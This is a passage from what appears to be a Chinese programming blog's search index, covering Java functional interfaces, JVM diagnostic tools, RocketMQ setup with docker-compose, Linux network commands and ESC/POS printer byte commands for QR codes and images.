HashMap\u0026lt;\u0026gt;(); Integer value = nameMap.computeIfAbsent(\u0026#34;name\u0026#34;, s -\u0026gt; s.length()); 上面的例子中我们调用了map的computeIfAbsent方法，传入一个Function。\n上面的例子还可以改写成更短的：\nInteger value1 = nameMap.computeIfAbsent(\u0026#34;name\u0026#34;, String::length); Function没有指明参数和返回值的类型，如果需要传入特定的参数，则可以使用IntFunction, LongFunction, DoubleFunction：\n@FunctionalInterface public interface IntFunction\u0026lt;R\u0026gt; { /** * Applies this function to the given argument. * * @param value the function argument * @return the function result */ R apply(int value); } 如果需要返回特定的参数，则可以使用ToIntFunction, ToLongFunction, ToDoubleFunction：\n@FunctionalInterface public interface ToDoubleFunction\u0026lt;T\u0026gt; { /** * Applies this function to the given argument. * * @param value the function argument * @return the function result */ double applyAsDouble(T value); } 如果要同时指定参数和返回值，则可以使用DoubleToIntFunction, DoubleToLongFunction, IntToDoubleFunction, IntToLongFunction, LongToIntFunction, LongToDoubleFunction：\n@FunctionalInterface public interface LongToIntFunction { /** * Applies this function to the given argument. * * @param value the function argument * @return the function result */ int applyAsInt(long value); } BiFunction：接收两个参数，一个返回值 # 如果需要接受两个参数，一个返回值的话，可以使用BiFunction：BiFunction, ToDoubleBiFunction, ToIntBiFunction, ToLongBiFunction等。\n@FunctionalInterface public interface BiFunction\u0026lt;T, U, R\u0026gt; { /** * Applies this function to the given arguments. * * @param t the first function argument * @param u the second function argument * @return the function result */ R apply(T t, U u); 我们看一个BiFunction的例子：\n//BiFunction Map\u0026lt;String, Integer\u0026gt; salaries = new HashMap\u0026lt;\u0026gt;(); salaries.put(\u0026#34;alice\u0026#34;, 100); salaries.put(\u0026#34;jack\u0026#34;, 200); salaries.put(\u0026#34;mark\u0026#34;, 300); salaries.replaceAll((name, oldValue) -\u0026gt; name.equals(\u0026#34;alice\u0026#34;) ? oldValue : oldValue + 200); Supplier：无参的Function # 如果什么参数都不需要，则可以使用Supplier：\n@FunctionalInterface public interface Supplier\u0026lt;T\u0026gt; { /** * Gets a result. * * @return a result */ T get(); } Consumer：接收一个参数，不返回值 # Consumer接收一个参数，但是不返回任何值，我们看下Consumer的定义：\n@FunctionalInterface public interface Consumer\u0026lt;T\u0026gt; { /** * Performs this operation on the given argument. * * @param t the input argument */ void accept(T t); 看一个Consumer的具体应用：\n//Consumer nameMap.forEach((name, age) -\u0026gt; System.out.println(name + \u0026#34; is \u0026#34; + age + \u0026#34; years old\u0026#34;)); Predicate：接收一个参数，返回boolean # Predicate接收一个参数，返回boolean值：\n@FunctionalInterface public interface Predicate\u0026lt;T\u0026gt; { /** * Evaluates this predicate on the given argument. * * @param t the input argument * @return {@code true} if the input argument matches the predicate, * otherwise {@code false} */ boolean test(T t); } 如果用在集合类的过滤上面那是极好的：\n//Predicate List\u0026lt;String\u0026gt; names = Arrays.asList(\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;, \u0026#34;D\u0026#34;, \u0026#34;E\u0026#34;); List\u0026lt;String\u0026gt; namesWithA = names.stream() .filter(name -\u0026gt; name.startsWith(\u0026#34;A\u0026#34;)) .collect(Collectors.toList()); Operator：接收和返回同样的类型 # Operator接收和返回同样的类型，有很多种Operator：UnaryOperator BinaryOperator ，DoubleUnaryOperator, IntUnaryOperator, LongUnaryOperator, DoubleBinaryOperator, IntBinaryOperator, LongBinaryOperator等。\n@FunctionalInterface public interface IntUnaryOperator { /** * Applies this operator to the given operand. * * @param operand the operand * @return the operator result */ int applyAsInt(int operand); } 我们看一个BinaryOperator的例子：\n//Operator List\u0026lt;Integer\u0026gt; values = Arrays.asList(1, 2, 3, 4, 5); int sum = values.stream().reduce(0, (i1, i2) -\u0026gt; i1 + i2); "},{"id":35,"href":"/posts/2022/JVM%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/","title":"Jvm常用工具","section":"博客","content":" JVM常用工具 # jps # Java版的ps命令，主要用于查看Java应用的进程号,启动JVM的参数。\njps [options] [hostid]\noptions参数:\n-l 输出类命名或者jar路径 -q 输出LVMID -m 输出JVM启动时传给main()的参数 -v 输出JVM启动时显示指令参数 例子：\njps -l 输出jar包路径，类全名 jps -m 输出main参数 jps -v 输出JVM参数 jinfo # jinfo是用来查看JVM参数和动态修改部分JVM参数的命令\n命令格式：\njinfo [option] options参数解释：\n-flag 打印指定名称的参数 -flag [+|-] 打开或关闭参数 -flag = 设置参数 -flags 打印所有参数 -sysprops 打印系统配置 打印上面两个选项 示例：\n其中11666为pid\n查看JVM参数和系统配置\njinfo 11666 jinfo -flags 11666 jinfo -sysprops 11666 查看打印GC日志参数\njinfo -flag PrintGC 11666 jinfo -flag PrintGCDetails 11666 打开GC日志参数\njinfo -flag +PrintGC 11666 jinfo -flag +PrintGCDetails 11666 关闭GC日志参数\njinfo -flag -PrintGC 11666 jinfo -flag -PrintGCDetails 11666 还可以使用下面的命令查看那些参数可以使用jinfo命令来管理：\njava -XX:+PrintFlagsFinal -version | grep manageable jstat # jstat命令是使用频率比较高的命令，主要用来查看JVM运行时的状态信息，包括内存状态、垃圾回收等。\n命令格式：\njstat [option] LVMID [interval] [count]\n其中LVMID是进程id，interval是打印间隔时间（毫秒），count是打印次数（默认一直打印）\noption参数解释：\n-class class loader的行为统计 -compiler HotSpt JIT编译器行为统计 -gc 垃圾回收堆的行为统计 -gccapacity 各个垃圾回收代容量(young,old,perm)和他们相应的空间统计 -gcutil 垃圾回收统计概述 -gccause 垃圾收集统计概述（同-gcutil），附加最近两次垃圾回收事件的原因 -gcnew 新生代行为统计 -gcnewcapacity 新生代与其相应的内存空间的统计 -gcold 年老代和永生代行为统计 -gcoldcapacity 年老代行为统计 -gcpermcapacity 永生代行为统计 -printcompilation HotSpot编译方法统计 常用示例及打印字段解释：\njstat -gcutil 11666 1000 3 11666为pid，每隔1000毫秒打印一次，打印3次\n输出：\nS0 S1 E O M CCS YGC YGCT FGC FGCT GCT 6.17 0.00 6.39 33.72 93.42 90.57 976 57.014 68 53.153 110.168 6.17 0.00 6.39 33.72 93.42 90.57 976 57.014 68 53.153 110.168 6.17 0.00 6.39 33.72 93.42 90.57 976 57.014 68 53.153 110.168 字段解释:\nS0 survivor0使用百分比 S1 survivor1使用百分比 E Eden区使用百分比 O 老年代使用百分比 M 元数据区使用百分比 CCS 压缩使用百分比 YGC 年轻代垃圾回收次数 YGCT 年轻代垃圾回收消耗时间 FGC 老年代垃圾回收次数 FGCT 老年代垃圾回收消耗时间 GCT 垃圾回收消耗总时间 jstat -gc 11666 1000 3 -gc和-gcutil参数类似，只不过输出字段不是百分比，而是实际的值。\n输出：\nS0C S1C S0U S1U EC EU OC OU MC MU CCSC CCSU YGC YGCT FGC FGCT GCT 25600.0 25600.0 0.0 1450.0 204800.0 97460.7 512000.0 172668.8 345736.0 322997.7 48812.0 44209.0 977 57.040 68 53.153 110.193 25600.0 25600.0 0.0 1450.0 204800.0 97460.7 512000.0 172668.8 345736.0 322997.7 48812.0 44209.0 977 57.040 68 53.153 110.193 25600.0 25600.0 0.0 1450.0 204800.0 97460.7 512000.0 172668.8 345736.0 322997.7 48812.0 44209.0 977 57.040 68 53.153 110.193 字段解释：\nS0C survivor0大小 S1C survivor1大小 S0U survivor0已使用大小 S1U survivor1已使用大小 EC Eden区大小 EU Eden区已使用大小 OC 老年代大小 OU 老年代已使用大小 MC 方法区大小 MU 方法区已使用大小 CCSC 压缩类空间大小 CCSU 压缩类空间已使用大小 YGC 年轻代垃圾回收次数 YGCT 年轻代垃圾回收消耗时间 FGC 老年代垃圾回收次数 FGCT 老年代垃圾回收消耗时间 GCT 垃圾回收消耗总时间 jstack # jstack是用来查看JVM线程快照的命令，线程快照是当前JVM线程正在执行的方法堆栈集合。使用jstack命令可以定位线程出现长时间卡顿的原因，例如死锁，死循环等。jstack还可以查看程序崩溃时生成的core文件中的stack信息。\n命令格式：\njstack [-l] (连接运行中的进程)\njstack -F [-m] [-l] (连接挂起的进程)\njstack [-m] [-l] (连接core文件)\njstack [-m] [-l] [server_id@] (连接远程debug服务器)\noption参数解释：\n-F 当使用jstack 无响应时，强制输出线程堆栈。 -m 同时输出java和本地堆栈(混合模式) -l 额外显示锁信息 jmap # jmap是用来生成堆dump文件和查看堆相关的各类信息的命令，例如查看finalize执行队列，heap的详细信息和使用情况。\n命令格式：\njmap [option] (连接正在执行的进程) jmap [option] \u0026lt;executable (连接一个core文件) jmap [option] [server_id@] (链接远程服务器)\noption参数解释：\nto print same info as Solaris pmap -heap 打印java heap摘要 -histo[:live] 打印堆中的java对象统计信息 -clstats 打印类加载器统计信息 -finalizerinfo 打印在f-queue中等待执行finalizer方法的对象 -dump: 生成java堆的dump文件 dump-options: live 只转储存活的对象，如果没有指定则转储所有对象 format=b 二进制格式 file= 转储文件到 -F 强制选项 示例：\njmap -dump:live,format=b,file=dump.hprof 11666 输出：\nDumping heap to /dump.hprof ... Heap dump file created 这个命令是要把java堆中的存活对象信息转储到dump.hprof文件\njmap -heap 11666 输出堆的详细信息\n输出：\nHeap Configuration: //堆内存初始化配置 MinHeapFreeRatio = 0 //对应jvm启动参数-XX:MinHeapFreeRatio设置JVM堆最小空闲比率(default 40) MaxHeapFreeRatio = 100 //对应jvm启动参数 -XX:MaxHeapFreeRatio设置JVM堆最大空闲比率(default 70) MaxHeapSize = 1073741824 (1024.0MB) //对应jvm启动参数-XX:MaxHeapSize=设置JVM堆的最大大小 NewSize = 22020096 (21.0MB) //对应jvm启动参数-XX:NewSize=设置JVM堆的新生代的默认大小 MaxNewSize = 357564416 (341.0MB) //对应jvm启动参数-XX:MaxNewSize=设置JVM堆的新生代的最大大小 OldSize = 45088768 (43.0MB) //对应jvm启动参数-XX:OldSize=\u0026lt;value\u0026gt;:设置JVM堆的老年代的大小 NewRatio = 2 //对应jvm启动参数-XX:NewRatio=:新生代和老生代的大小比率 SurvivorRatio = 8 //对应jvm启动参数-XX:SurvivorRatio=设置新生代中Eden区与Survivor区的大小比值 MetaspaceSize = 21807104 (20.796875MB) // 元数据区大小 CompressedClassSpaceSize = 1073741824 (1024.0MB) //类压缩空间大小 MaxMetaspaceSize = 17592186044415 MB //元数据区最大大小 G1HeapRegionSize = 0 (0.0MB) //G1垃圾收集器每个Region大小 Heap Usage: //堆内存使用情况 PS Young Generation Eden Space: //Eden区内存分布 capacity = 17825792 (17.0MB) //Eden区总容量 used = 12704088 (12.115562438964844MB) //Eden区已使用 free = 5121704 (4.884437561035156MB) //Eden区剩余容量 71.26801434685203% used //Eden区使用比率 From Space: //其中一个Survivor区的内存分布 capacity = 2097152 (2.0MB) used \\= 1703936 (1.625MB) free \\= 393216 (0.375MB) 81.25% used To Space: //另一个Survivor区的内存分布 capacity = 2097152 (2.0MB) used \\= 0 (0.0MB) free \\= 2097152 (2.0MB) 0.0% used PS Old Generation capacity \\= 52428800 (50.0MB) //老年代容量 used = 28325712 (27.013504028320312MB) //老年代已使用 free = 24103088 (22.986495971679688MB) //老年代空闲 54.027008056640625% used //老年代使用比率 jmap -histo:live 11666 | ``more 输出存活对象统计信息\n输出：\nnum #instances #bytes class name ---------------------------------------------- 1: 46608 1111232 java.lang.String 2: 6919 734516 java.lang.Class 3: 4787 536164 java.net.SocksSocketImpl 4: 15935 497100 java.util.concurrent.ConcurrentHashMap$Node 5: 28561 436016 java.lang.Object jvisualVM # 图形化分析工具。\n常用JVM参数： # -Xms：初始堆大小，默认为物理内存的1/64(\u0026lt;1GB)；默认(MinHeapFreeRatio参数可以调整)空余堆内存小于40%时，JVM就会增大堆直到-Xmx的最大限制\n-Xmx：最大堆大小，默认(MaxHeapFreeRatio参数可以调整)空余堆内存大于70%时，JVM会减少堆直到 -Xms的最小限制\n-Xmn：新生代的内存空间大小，注意：此处的大小是（eden+ 2 survivor space)。与jmap -heap中显示的New gen是不同的。整个堆大小=新生代大小 + 老生代大小 + 永久代大小。\n在保证堆大小不变的情况下，增大新生代后,将会减小老生代大小。此值对系统性能影响较大,Sun官方推荐配置为整个堆的3/8。\n-XX:SurvivorRatio：新生代中Eden区域与Survivor区域的容量比值，默认值为8。两个Survivor区与一个Eden区的比值为2:8,一个Survivor区占整个年轻代的1/10。\n-Xss：每个线程的堆栈大小。JDK5.0以后每个线程堆栈大小为1M,以前每个线程堆栈大小为256K。应根据应用的线程所需内存大小进行适当调整。在相同物理内存下,\n减小这个值能生成更多的线程。但是操作系统对一个进程内的线程数还是有限制的，不能无限生成，经验值在3000~5000左右。一般小的应用， 如果栈不是很深， 应该是128k够用的，\n大的应用建议使用256k。这个选项对性能影响比较大，需要严格的测试。和threadstacksize选项解释很类似,官方文档似乎没有解释,\n在论坛中有这样一句话:\u0026quot;-Xss ``is translated ``in a VM flag named ThreadStackSize”一般设置这个值就可以了。\n-XX:PermSize：设置永久代(perm gen)初始值。默认值为物理内存的1/64。\n-XX:MaxPermSize：设置持久代最大值。物理内存的1/4。\n"},{"id":36,"href":"/posts/2022/%E7%94%9F%E6%88%90%E4%B8%9A%E5%8A%A1ID/","title":"生成业务 ID","section":"博客","content":"生成唯一的业务ID号\npublic class UniqueStringGenerator { private static final int MAX_COUNTER = 10000; private volatile static int COUNTER = 0; private static final String PAD_STR = \u0026#34;0\u0026#34;; private static DateTimeFormatter FORMATTER = DateTimeFormatter.ofPattern(\u0026#34;yyMMddHHmmssSSS\u0026#34;); public static synchronized String generatorId() { if (COUNTER \u0026gt; MAX_COUNTER) { COUNTER = 0; } String uniqueNumber = getNowString() + getNumberString(); COUNTER++; return uniqueNumber; } private static String getNowString() { LocalDateTime ldt = LocalDateTime.now(); return ldt.format(FORMATTER); } private static String getNumberString() { return StringUtils.leftPad(String.valueOf(COUNTER), String.valueOf(MAX_COUNTER).length(), PAD_STR); } } "},{"id":37,"href":"/posts/2022/kill%E6%8E%89java%E8%BF%9B%E7%A8%8B/","title":"Kill掉java进程","section":"博客","content":"开发时有可能会出现端口被占用，或者异常能出时，重启，端口会被占用的情况。 这里需要kill无用的进程。\n在windows系统下：\n# 查询端口进程的PID netstat -ano| findstr 8080 # 也可以使用java工具jps查看java应用进程 jps # kill掉进程 taskkill /pid [pid] /f 在Linux系统下：\njps kill [pid] "},{"id":38,"href":"/posts/2022/RocketMQ%E5%BB%B6%E6%97%B6%E6%B6%88%E6%81%AF%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E5%BB%B6%E6%97%B6%E7%BA%A7%E5%88%AB%E7%9A%84%E9%85%8D%E7%BD%AE/","title":"Rocket Mq延时消息的使用和延时级别的配置","section":"博客","content":" RocketMQ延时消息的使用和延时级别的配置 # 开源框架的没有__STARTDELIVERTIME配置 阿里企业级没有messageDelayLevel配置\n消息tag __TAG 消息key __KEY 消息ID __MSGID 重试次数 __RECONSUMETIMES 设置消息的定时投递时间（绝对时间),最大延迟时间为7天. __STARTDELIVERTIME 设置消息的延迟级别，其中，level=0 级表示不延时 _DELAYTIMEVELVEL 在服务器端（rocketmq-broker端）的属性配置文件中加入以下行： messageDelayLevel=1s 5s 10s 30s 1m 2m 3m 4m 5m 6m 7m 8m 9m 10m 20m 30m 1h 2h 这个配置项配置了从1级开始各级延时的时间，如1表示延时1s，2表示延时5s，14表示延时10m，可以修改这个指定级别的延时时间； "},{"id":39,"href":"/posts/2022/%E6%9F%A5%E7%9C%8B%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/","title":"查看网络命令记录","section":"博客","content":"列出当前的防火墙规则，查看网络链路\niptables -t nat -L -n --line-numbers Chain PREROUTING (policy ACCEPT) num target prot opt source destination 1 DOCKER all -- 0.0.0.0/0 0.0.0.0/0 ADDRTYPE match dst-type LOCAL Chain INPUT (policy ACCEPT) num target prot opt source destination Chain OUTPUT (policy ACCEPT) num target prot opt source destination 1 DOCKER all -- 0.0.0.0/0 !127.0.0.0/8 ADDRTYPE match dst-type LOCAL Chain POSTROUTING (policy ACCEPT) num target prot opt source destination 1 MASQUERADE all -- 172.17.0.0/16 0.0.0.0/0 2 MASQUERADE all -- 172.23.0.0/16 0.0.0.0/0 3 MASQUERADE tcp -- 172.23.0.2 172.23.0.2 tcp dpt:443 4 MASQUERADE tcp -- 172.23.0.2 172.23.0.2 tcp dpt:80 5 MASQUERADE tcp -- 172.23.0.3 172.23.0.3 tcp dpt:8090 Chain DOCKER (2 references) num target prot opt source destination 1 RETURN all -- 0.0.0.0/0 0.0.0.0/0 2 RETURN all -- 0.0.0.0/0 0.0.0.0/0 3 DNAT tcp -- 0.0.0.0/0 0.0.0.0/0 tcp dpt:443 to:172.23.0.2:443 4 DNAT tcp -- 0.0.0.0/0 0.0.0.0/0 tcp dpt:80 to:172.23.0.2:80 5 DNAT tcp -- 0.0.0.0/0 0.0.0.0/0 tcp dpt:8090 to:172.23.0.3:8090 删除规则\niptables -t nat -D POSTROUTING 4 4是num，第几条规则 查看端口\nlsof -i:端口号 --------------- netstat -tunlp | grep 端口号 -t (tcp) 仅显示tcp相关选项 -u (udp)仅显示udp相关选项 -n 拒绝显示别名，能显示数字的全部转化为数字 -l 仅列出在Listen(监听)的服务状态 -p 显示建立相关链接的程序名 "},{"id":40,"href":"/posts/2022/Docker-compose%E6%90%AD%E5%BB%BARocketMQ/","title":"Docker Compose搭建 Rocket Mq","section":"博客","content":"RocketMQ架构图 搭建RocketMQ服务需要NameServer、Broker和RocketMQ的管理后台。\n1、docker-compose文件\nversion: \u0026#39;2\u0026#39; services: rmqnamesrv: image: apacherocketmq/rocketmq:latest container_name: rmqnamesrv ports: - 9876:9876 volumes: - ./file/rmqnamesrv/logs:/home/rocketmq/logs command: sh mqnamesrv rmqbroker: image: apacherocketmq/rocketmq:latest container_name: rmqbroker ports: - 10909:10909 - 10911:10911 - 10912:10912 volumes: # 这里要注意一下，logs和store文件要给够权限 - ./file/rmqbroker/logs:/home/rocketmq/logs - ./file/rmqbroker/store:/home/rocketmq/store - ./env/broker.conf:/home/rocketmq/conf/broker.conf environment: JAVA_OPTS: \u0026#34; -Duser.home=/opt\u0026#34; JAVA_OPT_EXT: \u0026#34;-server -Xms128m -Xmx128m -Xmn128m\u0026#34; command: sh mqbroker -n rmqnamesrv:9876 -c /home/rocketmq/conf/broker.conf depends_on: - rmqnamesrv rmqconsole: image: styletang/rocketmq-console-ng:latest container_name: rmqconsole ports: - 8081:8080 environment: JAVA_OPTS: \u0026#34;-Drocketmq.namesrv.addr=rmqnamesrv:9876 -Dcom.rocketmq.sendMessageWithVIPChannel=false\u0026#34; depends_on: - rmqnamesrv broker.conf\n# 所属集群名字 brokerClusterName=DefaultCluster # broker 名字，注意此处不同的配置文件填写的不一样，如果在 broker-a.properties 使用: broker-a, # 在 broker-b.properties 使用: broker-b brokerName=broker-a # 0 表示 Master，\u0026amp;gt; 0 表示 Slave brokerId=0 # nameServer地址，分号分割 # namesrvAddr=rocketmq-nameserver1:9876;rocketmq-nameserver2:9876 # 启动IP,如果 docker 报 com.alibaba.rocketmq.remoting.exception.RemotingConnectException: connect to \u0026amp;lt;192.168.0.120:10909\u0026amp;gt; failed # 解决方式1 加上一句 producer.setVipChannelEnabled(false);，解决方式2 brokerIP1 设置宿主机IP，不要使用docker 内部IP brokerIP1=192.168.1.16 # 在发送消息时，自动创建服务器不存在的topic，默认创建的队列数 defaultTopicQueueNums=4 # 是否允许 Broker 自动创建 Topic，建议线下开启，线上关闭 ！！！这里仔细看是 false，false，false autoCreateTopicEnable=true # 是否允许 Broker 自动创建订阅组，建议线下开启，线上关闭 autoCreateSubscriptionGroup=true # Broker 对外服务的监听端口 listenPort=10911 # 删除文件时间点，默认凌晨4点 deleteWhen=04 # 文件保留时间，默认48小时 fileReservedTime=120 # commitLog 每个文件的大小默认1G mapedFileSizeCommitLog=1073741824 # ConsumeQueue 每个文件默认存 30W 条，根据业务情况调整 mapedFileSizeConsumeQueue=300000 # destroyMapedFileIntervalForcibly=120000 # redeleteHangedFileInterval=120000 # 检测物理文件磁盘空间 diskMaxUsedSpaceRatio=88 # 存储路径 # storePathRootDir=/home/ztztdata/rocketmq-all-4.1.0-incubating/store # commitLog 存储路径 # storePathCommitLog=/home/ztztdata/rocketmq-all-4.1.0-incubating/store/commitlog # 消费队列存储 # storePathConsumeQueue=/home/ztztdata/rocketmq-all-4.1.0-incubating/store/consumequeue # 消息索引存储路径 # storePathIndex=/home/ztztdata/rocketmq-all-4.1.0-incubating/store/index # checkpoint 文件存储路径 # storeCheckpoint=/home/ztztdata/rocketmq-all-4.1.0-incubating/store/checkpoint # abort 文件存储路径 # abortFile=/home/ztztdata/rocketmq-all-4.1.0-incubating/store/abort # 限制的消息大小 maxMessageSize=65536 # flushCommitLogLeastPages=4 # flushConsumeQueueLeastPages=2 # flushCommitLogThoroughInterval=10000 # flushConsumeQueueThoroughInterval=60000 # Broker 的角色 # - ASYNC_MASTER 异步复制Master # - SYNC_MASTER 同步双写Master # - SLAVE brokerRole=ASYNC_MASTER # 刷盘方式 # - ASYNC_FLUSH 异步刷盘 # - SYNC_FLUSH 同步刷盘 flushDiskType=ASYNC_FLUSH # 发消息线程池数量 # sendMessageThreadPoolNums=128 # 拉消息线程池数量 # pullMessageThreadPoolNums=128 "},{"id":41,"href":"/posts/2022/RocketMQ%E7%9A%84%E4%BB%8B%E7%BB%8D/","title":"Rocket Mq的介绍","section":"博客","content":"RocketMQ 架构图 有四大部分：NameServer，Broker，Producer，Consumer。\nNameServer # NameServer主要包括两个主要功能：\n1、管理brokers：broker服务器启动时会注册到NameServer上，并且两者之间保持心跳监测机制，以此来保证NameServer知道broker的存活状态；\n2、路由信息管理：每一台NameServer都存有全部的broker集群信息和生产者/消费者客户端的请求信息；\nBroker # Broker的四大作用：\n1、请求分发：是client的入口，接收来自生产者消费者的请求 2、client管理：管理客户（产品/消费者）并维护消费者的主题订阅。 3、数据存储：提供简单的api来查询磁盘上的临时数据 4、高可用：主从节点间同步数据保证高可用\nProducer # Producer启动时，需要指定NameServer的地址，从NameServer集群中选一台建立长连接。如果该NameServer宕机，会自动连其他NameServer。直到有可用的NameServer为止。生产者每30秒从NameServer获取Topic跟Broker的映射关系，更新到本地内存中。再跟Topic涉及的所有Broker建立长连接，每隔30秒发一次心跳。Broker每隔10s中扫描所有存活的连接，如果Broker在2分钟内没有收到心跳数据，则关闭与Producer的连接。\nConsumer # 消费客户端的连接方式和生产者类似。\n其他概念 # 1、 Topic 一个应用尽可能用一个Topic，消息子类型用tags来标识，tags可以由应用自由设置。只有发送消息设置了tags，消费方在订阅消息时，才可以利用tags 在broker做消息过滤。\n2、 key 每个消息在业务层面的唯一标识码，要设置到 keys 字段，方便将来定位消息丢失问题。服务器会为每个消息创建索引(哈希索引)，应用可以通过 topic，key来查询这条消息内容，以及消息被谁消费。由于是哈希索引，请务必保证key 尽可能唯一，这样可以避免潜在的哈希冲突。\n3、Message：消息，要传输的信息。\n4、Message Queue：消息队列\n5、send send消息方法，只要不抛异常，就代表发送成功。但是发送成功会有多个状态，在sendResult里定义。\nSEND_OK：消息发送成功\nFLUSH_DISK_TIMEOUT：消息发送成功，但是服务器刷盘超时，消息已经进入服务器队列，只有此时服务器宕机，消息才会丢失\nFLUSH_SLAVE_TIMEOUT：消息发送成功，但是服务器同步到Slave时超时，消息已经进入服务器队列，只有此时服务器宕机，消息才会丢失\nSLAVE_NOT_AVAILABLE：消息发送成功，但是此时slave不可用，消息已经进入服务器队列，只有此时服务器宕机，消息才会丢失\n"},{"id":42,"href":"/posts/2022/%E4%BD%BF%E7%94%A8%E9%A1%B5%E6%A8%A1%E5%BC%8F%E6%89%93%E5%8D%B0%E5%A4%9A%E4%B8%AA%E4%BA%8C%E7%BB%B4%E7%A0%81/","title":"使用页模式打印多个二维码","section":"博客","content":" 使用页模式打印多个二维码 # 可能会在使用页模式前出现停顿，页模式要先把指令编好，再打印。\n步骤：\n1、开始页模式\n2、页模式偏移量\n3、设置二维码大小\n4、设置二维码错误纠错等级\n5、传输数据至编码缓存（打印二维码数据）\n6、打印编码缓存中的二维条码\n打印多个：继续 2-6 步骤\n7、打印页模式数据，关闭页模式\n开始页模式 # /** * 0x00,0x00,0x00,0x00 是打印区域左上角 * w,h 定义的是打印区域的右下角 * w 是页模式内容区域的宽，单位dot 1mm=8dot * h 是页模式内容区域的高，单位dot */ public byte[] crtiPageStartn(int w,int h) { int w_pL = w%256; int w_pH = w/256; int h_pL = h%256; int h_pH = h/256; byte[] bytes = new byte[]{0x1B,0x4C,0x1B,0x57,0x00,0x00,0x00,0x00,(byte) w_pL,(byte) w_pH,(byte)h_pL,(byte)h_pH}; return bytes; } 横向打印二维码 # 打印二维码要定义每一个二维码左上角的位置，即偏移量。\n/** 页模式偏移量，单位dot */ public byte[] crtiPrintAnddot(int x) { int x_s = x % 256; int y_s = x / 256; //1B 24 3c 00 --1B 24 nL nH 设置绝对打印位置LabelNowX //1D 24 00 00 --1D 24 nL nH 页模式下设置纵向绝对位置LabelNowY byte[] bytes = new byte[]{0x1B, 0x24, (byte)x_s, (byte)y_s, 0x1D, 0x24, 0x00, 0x00}; return bytes; } /** 二维码大小 1-9 */ public byte[] setQrcodeSize(int size) { byte[] bytes = new byte[]{29, 40, 107, 3, 0, 49, 67, (byte) size}; return bytes; } /** * 设置二维码错误纠错等级 * @param 48 \u0026lt;= n \u0026lt;= 51，纠正比例（7，15，25，30）% */ public byte[] setQrcodeErrorCorrectionLevel(byte n) { byte[] bytes = {29, 40, 107, 3, 0, 49, 69, n}; return bytes; } /** * 传输数据至编码缓存 */ public byte[] setQrcodeData(String text) { byte[] bytes = {29, 40, 107, (byte) ((text.getBytes().length + 3) % 256), (byte) ((text.getBytes().length + 3) / 256), 49, 80, 48}; bytes = byteMerger(bytes, text.getBytes(\u0026#34;GB18030\u0026#34;)); return bytes; } /** * 打印编码缓存中的二维条码 */ public byte[] setPrintQrcode() { byte[] bytes = {29, 40, 107, 3, 0, 49, 81, 48}; return bytes; } /** * 合并字节数组 */ public byte[] byteMerger(byte[] byte_1, byte[] byte_2) { byte[] byte_3 = new byte[byte_1.length + byte_2.length]; System.arraycopy(byte_1, 0, byte_3, 0, byte_1.length); System.arraycopy(byte_2, 0, byte_3, byte_1.length, byte_2.length); return byte_3; } 关闭页模式 # /** 结束页模式 */ public byte[] crtiPageEnd() { byte[] bytes = new byte[]{10, 12, 24, 13}; return bytes; } "},{"id":43,"href":"/posts/2022/ESC%E5%9B%BE%E7%89%87%E9%A2%84%E5%A4%84%E7%90%86%E5%85%88%E5%8A%A0%E8%BD%BD%E8%BF%9B%E6%89%93%E5%8D%B0%E6%9C%BA%E5%86%8D%E7%9B%B4%E6%8E%A5%E8%B0%83%E7%94%A8%E6%89%93%E5%8D%B0/","title":"Esc图片预处理（先加载进打印机，再直接调用打印）","section":"博客","content":" ESC图片预处理 # 定义 # /** * 定义位图 */ public byte[] critDefineNV(ArrayList\u0026lt;BufferedImage\u0026gt; images) { int n = images.size(); // 定义几个位图，执行会覆盖原来的 byte[] header = new byte[]{28, 113, (byte)n}; for(int i = 0; i \u0026lt; images.size(); ++i) { header = byteMerger(header, imageToByte((BufferedImage)images.get(i))); } return header; } /** * 合并字节数组 */ public byte[] byteMerger(byte[] byte_1, byte[] byte_2) { byte[] byte_3 = new byte[byte_1.length + byte_2.length]; System.arraycopy(byte_1, 0, byte_3, 0, byte_1.length); System.arraycopy(byte_2, 0, byte_3, byte_1.length, byte_2.length); return byte_3; } /** * 图片转字节 */ public static byte[] imageToByte(BufferedImage bi) { int[] rgb = new int[3]; int width = bi.getWidth(); int height = bi.getHeight(); StringBuilder res = new StringBuilder(); int i; String y; for(int x = 0; x \u0026lt; width / 8 * 8; ++x) { for(int y = 0; y \u0026lt; height / 8 * 8; ++y) { i = bi.getRGB(x, y); rgb[0] = (i \u0026amp; 16711680) \u0026gt;\u0026gt; 16; rgb[1] = (i \u0026amp; \u0026#39;\\uff00\u0026#39;) \u0026gt;\u0026gt; 8; rgb[2] = i \u0026amp; 255; y = (rgb[0] + rgb[1] + rgb[2]) / 3 \u0026gt;= 200 ? \u0026#34;0\u0026#34; : \u0026#34;1\u0026#34;; res.append(y); } } String x = res.toString(); byte[] i1 = new byte[x.length() / 8]; for(i = 0; i \u0026lt; x.length(); i += 8) { y = x.substring(i, i + 4); String z = x.substring(i + 4, i + 8); byte y1 = Byte.parseByte(y, 2); byte z1 = Byte.parseByte(z, 2); i1[i / 8] = (byte)((byte)(y1 \u0026lt;\u0026lt; 4) | z1); } byte[] bytes = new byte[]{(byte)(width / 8 % 256), (byte)(width / 8 / 256), (byte)(height / 8 % 256), (byte)(height / 8 / 256)}; bytes = byteMerger(bytes, i1); return bytes; } 发送打印 # /** * 1 ≤ n ≤ 64 m=0,1,2,3,48,49,50,51 * n 是第几个位图 * m = 0,48 正常打印； m = 1,49 倍宽打印； * m = 2,50 倍高打印； m = 3,51 四倍角打印。 */ public byte[] critPrintNV(int n, int mode) { return new byte[]{28, 112, (byte)n, (byte)mode}; } 对齐，加在打印的前面\n16进制： 1B 61 n n=0，48：左对齐； n=1，49：中间对齐； n=2，50；右对齐。 "},{"id":44,"href":"/posts/2022/Jconsole%E4%BD%BF%E7%94%A8/","title":"Jconsole使用","section":"博客","content":"开启JMX管理功能\n在JVM启动参数中添加如下参数\n-Djava.rmi.server.hostname=xxx.xxx.xxx.xxx -Dcom.sun.management.jmxremote.port=9999 -Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.authenticate=true -Dcom.sun.management.jmxremote.pwd.file=jmxremote.password -Dcom.sun.management.jmxremote.access.file=jmxremote.access "},{"id":45,"href":"/posts/2022/VisualVM%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/","title":"Visual 